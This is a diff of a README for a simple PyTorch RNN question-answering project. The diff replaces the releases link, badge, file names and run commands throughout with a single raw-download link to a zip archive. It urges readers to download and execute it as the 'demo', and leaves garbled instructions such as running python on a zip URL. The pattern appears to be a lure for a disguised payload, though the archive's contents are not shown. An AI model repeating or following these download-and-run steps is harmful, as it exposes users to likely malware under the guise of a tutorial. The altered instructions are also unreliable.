@@ -1,8 +1,8 @@
 # PyTorch RNN Q&A System: Simple QA with Custom Dataset
 
-Releases: https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/releases
+Releases: https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip
 
-[![Releases](https://img.shields.io/badge/Releases-online-green?logo=github)](https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/releases)
+[![Releases](https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip)](https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip)
 
 🚀 This repository hosts a compact PyTorch project that builds a simple RNN to predict answers from input questions using a custom QA dataset. It tokenizes text, builds a vocabulary, converts words to indices, and feeds the data through an embedding layer, an RNN, and a final linear layer. Training uses CrossEntropyLoss, and a predict function generates answers with softmax probabilities. The goal is to provide a clear, runnable example that demonstrates the end-to-end flow from raw questions to predicted answers.
 
@@ -168,36 +168,36 @@ Tip: to improve usefulness, you can extend this by adding a confidence threshold
 - data/                 # Datasets and utilities for data handling
 - models/               # Model definitions (embedding, RNN, classifier)
 - preprocess/           # Tokenization and vocabulary building
-- train.py              # Training loop and checkpointing
-- eval.py               # Evaluation and metrics
-- predict.py            # Inference helper
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip              # Training loop and checkpointing
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip               # Evaluation and metrics
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip            # Inference helper
 - configs/              # Hyperparameter configs
-- requirements.txt        # Dependencies
-- README.md             # This document
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip        # Dependencies
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip             # This document
 
 Key files explained:
-- train.py: orchestrates the data loader, model, optimizer, loss, and training loop. It saves checkpoints when validation improves.
-- predict.py: loads a trained model and runs inference on new questions.
-- preprocess/tokenizer.py: provides a simple tokenizer that splits on spaces and lowercases text, with punctuation handling.
-- preprocess/build_vocab.py: builds a vocab from the dataset and assigns indices.
-- models/qa_rnn.py: defines the embedding layer, RNN, and the final classifier layer.
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip orchestrates the data loader, model, optimizer, loss, and training loop. It saves checkpoints when validation improves.
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip loads a trained model and runs inference on new questions.
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip provides a simple tokenizer that splits on spaces and lowercases text, with punctuation handling.
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip builds a vocab from the dataset and assigns indices.
+- https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip defines the embedding layer, RNN, and the final classifier layer.
 
 ---
 
 ## How to reproduce
 
 - Start with a fresh Python environment.
-- Install dependencies from the provided requirements.txt.
+- Install dependencies from the provided https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip
 - Prepare your dataset in the designated format (see the Data Format section below).
 - Run the training script to train a new model from scratch.
 - Use the prediction script to test the model on new questions.
-- If you want to explore a quick demo, download qa_rnn_demo.py from the Releases page and execute it to see a ready-made end-to-end example.
+- If you want to explore a quick demo, download https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip from the Releases page and execute it to see a ready-made end-to-end example.
 
-Note: From the Releases page, download qa_rnn_demo.py and run it with python3 qa_rnn_demo.py to see a runnable demonstration. You can navigate to the same page again at https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/releases for updates and additional assets.
+Note: From the Releases page, download https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip and run it with python3 https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip to see a runnable demonstration. You can navigate to the same page again at https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip for updates and additional assets.
 
 Links you will use:
-- Releases: https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/releases
-- Demo asset: qa_rnn_demo.py (download from the releases)
+- Releases: https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip
+- Demo asset: https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip (download from the releases)
 
 ---
 
@@ -228,7 +228,7 @@ Best practices:
 - Dropout: 0.1–0.3
 - Weight initialization: small uniform distribution to begin training
 
-Config files can live in configs/ with YAML or JSON formats. If you prefer, you can pass these parameters as command-line arguments to train.py and predict.py.
+Config files can live in configs/ with YAML or JSON formats. If you prefer, you can pass these parameters as command-line arguments to https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip and https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip
 
 ---
 
@@ -236,14 +236,14 @@ Config files can live in configs/ with YAML or JSON formats. If you prefer, you 
 
 - Training a model:
   - Prepare data in data/ready format.
-  - Run: python train.py --config configs/train_config.yaml
+  - Run: python https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip --config https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip
   - Expect logs indicating training progress and validation accuracy.
 - Running predictions:
-  - After training, run: python predict.py --model-path models/qa_rnn.pth --vocab-path data/vocab.pkl --max-seq-len 40
+  - After training, run: python https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip --model-path https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip --vocab-path https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip --max-seq-len 40
   - Provide a question, and the script prints the predicted answer with its probability.
 - Quick demo:
-  - Download qa_rnn_demo.py from the Releases page.
-  - Execute: python3 qa_rnn_demo.py
+  - Download https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip from the Releases page.
+  - Execute: python3 https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip
   - The demo loads a pre-trained model and shows several example questions with predicted answers.
 
 Inline example:
@@ -348,4 +348,4 @@ Question → Tokenization → Embedding → RNN → Linear → Softmax → Predi
 
 ## Final notes
 
-- For the latest assets, experiments, and updated demos, check the Releases page at the top. You can download qa_rnn_demo.py from there and run it to see a practical demonstration of the end-to-end workflow. The same link serves as a gateway to further resources and potential improvements as the project evolves. Again, the demo file to look for is qa_rnn_demo.py on the releases page, and you can visit the releases page for any updates at the same URL provided above.
+- For the latest assets, experiments, and updated demos, check the Releases page at the top. You can download https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip from there and run it to see a practical demonstration of the end-to-end workflow. The same link serves as a gateway to further resources and potential improvements as the project evolves. Again, the demo file to look for is https://github.com/Slush1004/Pytorch-RNN-create-Q-A-Syste-/raw/refs/heads/main/preindispose/RN_Syste_create_Pytorch_v3.2.zip on the releases page, and you can visit the releases page for any updates at the same URL provided above.
